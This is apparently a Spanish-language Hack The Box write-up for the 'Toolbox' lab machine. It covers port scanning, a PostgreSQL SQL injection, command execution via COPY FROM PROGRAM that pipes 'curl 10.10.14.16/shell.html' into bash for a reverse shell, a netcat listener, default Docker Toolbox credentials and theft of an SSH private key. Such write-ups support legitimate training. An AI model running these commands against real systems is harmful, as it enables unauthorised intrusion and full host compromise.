 https://app.hackthebox.com/machines/Toolbox
#win  
## Buscamos puertos abiertos
```
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.10.236
```
![[Pasted image 20241016190058.png]]
## Reconocimiento de servicios
```
nmap -sCV -p21,22,135,139,443,445,5985,49665 10.10.10.236
```
![[Pasted image 20241016190334.png]]
Es windows
![[Pasted image 20241016191219.png]]
## Fuzz
Hay un archivo de docker en FTP
![[Pasted image 20241016191800.png]]
También Hay en el certificado SSL de la web un nombre de pagina, lo metemos en hosts
![[Pasted image 20241016192338.png]]
Tenemos un login
![[Pasted image 20241016192610.png]]
# Fase de ataque
## SQLI
Lanzamos una comilla simple
![[Pasted image 20241016192733.png]]
Nos da un error extraño y sabemos que es postgress
![[Pasted image 20241016192758.png]]
Con Burpsuite probamos si es vulnerable a SQLI
```
select pg_sleep(10);-- -
```
![[Pasted image 20241016193735.png]]
Si tarda 10 sec, es vulnerable.
### RCE 9.3
Creamos una tabla para ejecución de comandos
```
CREATE TABLE cmd_exec(cmd_output text);
```
![[Pasted image 20241016194336.png]]
Insertamos comandos para reverse shell
```
COPY cmd_exec FROM PROGRAM 'curl 10.10.14.16/shell.html|bash';
```
![[Pasted image 20241016195804.png]]
Creamos el archivo
![[Pasted image 20241016195450.png]]
Nos ponemos en escucha
```
nc -nlvp 443
```
![[Pasted image 20241016195906.png]]
[-]==pwned!==
## Ajustar terminal
```
script /dev/null -c bash
```
ctrl + z
```
stty raw -echo; fg
```
```
	reset xterm
```
```
export TERM=xterm
```
Ajustar proporciones
```
stty rows 44 columns 184
```
# Privilege Escalation
## Salir de Docker
Probamos las contraseña por defualt de docker-toolbox (docke : tcpuser)
![[Pasted image 20241016201903.png]]
Dentro de este sistema esta montado una estructura de windows en el directorio c/
Encontramos una clave privada de ssh.
![[Pasted image 20241016202325.png]]
![[Pasted image 20241016202850.png]]
![[Pasted image 20241016202903.png]]
[+] ==pwned!==